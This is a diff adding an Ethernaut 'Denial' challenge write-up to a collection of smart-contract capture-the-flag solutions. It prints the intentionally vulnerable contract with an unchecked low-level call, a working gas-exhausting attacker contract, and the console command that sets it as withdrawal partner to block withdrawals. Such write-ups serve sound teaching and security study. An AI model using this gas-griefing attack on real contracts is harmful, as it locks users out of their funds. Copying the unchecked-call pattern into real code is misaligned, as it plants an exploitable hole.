@@ -257,6 +257,77 @@ contract SideEntranceLenderPoolAttacker {
 } 
 ```
 
+## Ethernaut - Denial
+
+### Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Denial {
+
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9e);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+### Exploit
+
+Notice that `partner.call{value:amountToSend}("")` will forward 63/64 of the available gas to the `partner`. Hence, we can perform a Denial-of-Service attack by deploying the contract below and setting this contract as the new `partner`. In the Ethernaut console, this can be achieved by first deploying the contract, e.g., via Remix, and then executing `await contract.setWithdrawPartner("<put your gas consumer contract address here>")` in the console.
+
+Here's a simple example of a contract that will consume all available gas:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSE
+pragma solidity ^0.8.0;
+
+contract GasConsumer {
+    uint public counter;
+
+    // Consumes all available gas
+    receive() external payable {
+        while (true) {
+            counter++; 
+        }
+    }
+}
+```
+
+Since 63/64 of the initial gas supply will already be gone after executing `partner.call{value:amountToSend}("")`, the remaining 1/64 won't be sufficient to execute the rest of the function. Therefore, the transaction will run out of gas and revert.
+
+Two final comments:
+
+1. Depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e., one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this attack. In our particular case, however, the challenge specifically requires us to assume that the transaction is of 1M gas or less. Under this assumption, the above DoS attack will be successful.
+2. You might be tempted to simply use `assert(false)` instead of an infinite loop to consume all gas. Admittedly, this approach would result in even fewer lines of code for the attacker contract. However, this approach only works prior to Solidity version 0.8.0! From 0.8.0 onwards, `assert` no longer uses the INVALID opcode (which consumes all remaining gas) but instead the REVERT opcode (which refunds the remaining gas to the sender). You can read up on the details in the [Solidity docs](https://docs.soliditylang.org/en/latest/080-breaking-changes.html) and in [this article](https://hackernoon.com/an-update-to-soliditys-assert-statement-you-mightve-missed).
+
+
 ## Ethernaut - Naught Coin
 
 ### Contract
